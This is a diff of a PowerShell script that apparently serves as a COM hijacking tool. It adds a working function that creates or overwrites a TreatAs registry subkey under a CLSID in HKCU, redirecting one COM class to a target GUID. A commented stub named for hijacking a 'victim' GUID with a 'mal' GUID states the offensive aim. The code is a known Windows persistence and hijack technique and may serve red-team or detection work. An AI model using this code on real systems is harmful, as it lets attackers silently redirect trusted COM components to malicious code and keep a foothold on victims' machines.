@@ -264,7 +264,7 @@ function Modify-COM-Object-binary($GUID, $binary) {
     }
 }
 
-function Modify-COM-Object-remove-subkey ($GUID, [Switch] $InProcServer32, [Switch] $LocalServer32, [Switch] $TreatAs){
+function Modify-COM-Object-remove-subkey($GUID, [Switch] $InProcServer32, [Switch] $LocalServer32, [Switch] $TreatAs) {
 
     if (!($GUID)) {
         return "GUID must be provided"
@@ -315,8 +315,50 @@ function Modify-COM-Object-remove-subkey ($GUID, [Switch] $InProcServer32, [Swit
     }
 }
 
-#function Modify-COM-Object-add-TreatAs ($GUID, $target_GUID)
+function Modify-COM-Object-add-TreatAs($GUID, $target_GUID) {
+    if (!($GUID)) {
+        return "GUID must be provided"
+    }
+    if (!($target_GUID)) {
+        return "treatas GUID must be provided"
+    }
+        
+    if (!($GUID.contains("{"))) {
+        $GUID = "{" + $GUID
+    }
+    if (!($GUID.contains("}"))) {
+        $GUID = $GUID + "}"
+    }
 
+    if (!($target_GUID.contains("{"))) {
+        $target_GUID = "{" + $target_GUID
+    }
+    if (!($target_GUID.contains("}"))) {
+        $target_GUID = $target_GUID + "}"
+    }
+
+    # check for the existence of the HKLM COM Object
+    $HKCU_obj = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$GUID" -ErrorAction SilentlyContinue
+    if (!($HKCU_obj)) {
+        return "$GUID does not exist in HKCU"
+    }
+
+    # check for the existence of the TreatAs subkey
+    $HKCU_treatas_obj = Get-Item -path "Registry::HKCU\Software\Classes\CLSID\$GUID\TreatAs" -ErrorAction SilentlyContinue
+    # if the TreatAs subkey does not exist, make it
+    $old_TreatAs_val = $False
+    if (!($HKCU_treatas_obj)) {
+        New-Item -Path "HKCU:\Software\Classes\CLSID\$GUID" -Name "TreatAs" | Out-Null
+    } else {
+        $old_TreatAs_val = (Get-ItemProperty -LiteralPath "Registry::HKCR\CLSID\$GUID\TreatAs").'(default)'
+    }
+    Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$GUID\TreatAs" -Name '(default)' -Value "$target_GUID" | Out-Null
+    if ($old_TreatAs_val) {
+        return "HKCU:\Software\Classes\CLSID\$GUID\TreatAs was present. TreatAs was changed from $old_TreatAs_val to $target_GUID"
+    } else {
+        return "HKCU:\Software\Classes\CLSID\$GUID\TreatAs was created. TreatAs was set to $target_GUID"
+    }
+}
 
 #function Hijack-COM-Object-by-TreatAs ($victim_GUID, $mal_GUID)
 
